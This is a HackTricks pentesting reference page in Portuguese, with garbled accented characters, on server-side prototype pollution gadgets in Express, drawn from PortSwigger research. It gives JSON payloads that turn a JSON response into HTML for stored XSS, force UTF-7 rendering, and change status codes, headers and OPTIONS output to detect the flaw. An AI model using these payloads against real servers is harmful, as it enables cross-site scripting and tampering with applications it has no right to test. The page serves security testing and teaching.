# Gadgets de Polui√ß√£o de Prot√≥tipo do Express

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
- **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladr√µes**.

O principal objetivo do WhiteIntel √© combater invas√µes de contas e ataques de ransomware resultantes de malwares que roubam informa√ß√µes.

Voc√™ pode verificar o site deles e experimentar o mecanismo de busca gratuitamente em:

{% embed url="https://whiteintel.io" %}

---

## Servir respostas XSS

**Para mais detalhes [consulte a pesquisa original](https://portswigger.net/research/server-side-prototype-pollution)**

### Alterar o tipo de conte√∫do JSON para HTML

Em um aplicativo Express usando uma **resposta de tipo de conte√∫do JSON** e refletindo um JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Nesses casos, XSS normalmente n√£o √© poss√≠vel com um tipo de conte√∫do JSON. No entanto, com a polui√ß√£o de prot√≥tipos, podemos **confundir o Express para fornecer uma resposta HTML.** Essa vulnerabilidade depende da aplica√ß√£o usar **`res.send(obj)`** e do uso do analisador de corpo com o tipo de conte√∫do application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Ao **poluir** as propriedades **`body`** e **`_body`**, √© poss√≠vel fazer com que o **Express sirva o tipo de conte√∫do HTML** e reflita a propriedade `_body`, resultando em XSS armazenado.

### Renderizar UTF7

√â poss√≠vel fazer o express **renderizar conte√∫do UTF-7 com**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## T√©cnicas de Escaneamento Seguro

### Espa√ßos JSON

O seguinte PP far√° com que os atributos dentro de um JSON tenham um espa√ßo extra que n√£o quebrar√° a funcionalidade:
```json
{"__proto__":{"json spaces": " "}}
```
Em seguida, um JSON refletido parecer√°:
```json
{"foo":  "bar"} -- Note the extra space
```
### Cabe√ßalhos Expostos

O seguinte gadget PP far√° com que o servidor envie de volta o cabe√ßalho HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
√â necess√°rio ter o **m√≥dulo CORS instalado**

### **M√©todo OPTIONS**

Com a carga √∫til a seguir, √© poss√≠vel **ocultar um m√©todo de uma resposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Status**

√â poss√≠vel alterar o **c√≥digo de status retornado** usando a seguinte carga √∫til PP:
```json
{"__proto__":{"status":510}}
```
### Erro

Quando voc√™ atribui a um prot√≥tipo um valor primitivo como uma string, isso produz uma **opera√ß√£o no-op, pois o prot√≥tipo precisa ser um objeto**. Se voc√™ tentar atribuir um objeto prot√≥tipo ao `Object.prototype` em si, isso ir√° **lan√ßar uma exce√ß√£o**. Podemos usar esses dois comportamentos para **detectar se a polui√ß√£o de prot√≥tipo foi bem-sucedida**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valor Refletido

Quando uma aplica√ß√£o inclui um objeto em sua resposta, criando um atributo com um **nome incomum ao lado de `__proto__`** pode ser esclarecedor. Especificamente, se **apenas o atributo incomum for retornado** na resposta, isso poderia indicar a vulnerabilidade da aplica√ß√£o:
```json
{"unusualName":"value","__proto__":"test"}
```
Al√©m disso, em cen√°rios onde uma biblioteca como o Lodash √© empregada, definir uma propriedade tanto via polui√ß√£o de prot√≥tipo (PP) quanto diretamente dentro do objeto oferece outra abordagem de diagn√≥stico. Se tal propriedade for omitida da resposta, sugere que o Lodash est√° verificando a exist√™ncia da propriedade no objeto alvo antes de mesclar:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
### Permitir Pontos

Existe uma op√ß√£o no Express que permite **criar objetos a partir de par√¢metros de string de consulta**.\
Voc√™ definitivamente poderia us√°-lo em uma **cadeia** de bugs para explorar uma **vulnerabilidade de polui√ß√£o de prot√≥tipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` cria um objeto no Node.**

## Refer√™ncias

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √© um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladr√µes**.

O principal objetivo do WhiteIntel √© combater tomadas de conta e ataques de ransomware resultantes de malwares que roubam informa√ß√µes.

Voc√™ pode acessar o site deles e experimentar o mecanismo gratuitamente em:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
